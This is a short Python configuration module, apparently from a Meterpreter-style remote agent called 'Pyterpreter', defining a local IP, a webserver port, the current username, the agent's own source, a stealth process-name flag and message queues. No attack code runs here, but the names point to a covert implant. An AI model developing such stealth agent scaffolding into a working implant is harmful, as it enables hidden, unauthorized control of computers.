from queue import Queue
import os
import pwd

from core.message import Message

LOCAL_IP = os.environ['PYTERPRETER_LOCAL_IP']
WEBSERVER_PORT = 1337
INSTANCE_ID: str = None
USERNAME = pwd.getpwuid(os.getuid()).pw_name
SOURCE_CODE: str = globals()['__source__']
STEALTH_PROCESS_NAME = os.environ.get('PYTERPRETER_STEALTH_PROCESS_NAME', False) is not False

messages_to_send: 'Queue[Message]' = None
messages_received: 'Queue[Message]' = None